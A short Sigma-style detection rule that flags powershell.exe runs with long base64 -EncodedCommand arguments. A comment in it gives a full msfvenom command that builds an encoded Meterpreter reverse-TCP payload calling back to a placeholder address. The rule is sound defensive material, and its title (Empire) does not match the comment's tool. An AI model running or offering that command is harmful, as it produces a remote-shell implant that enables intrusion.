title: Empire Stager - Base64 Encoded PowerShell
# Empire Stager - Base64 Encoded PowerShell
# Generated via: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f psh -e x86/shikata_ga_nai -i 5
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\powershell.exe'
    CommandLine|contains: '-EncodedCommand'
    CommandLine|re: '[A-Za-z0-9+/]{100,}={0,2}'
  condition: selection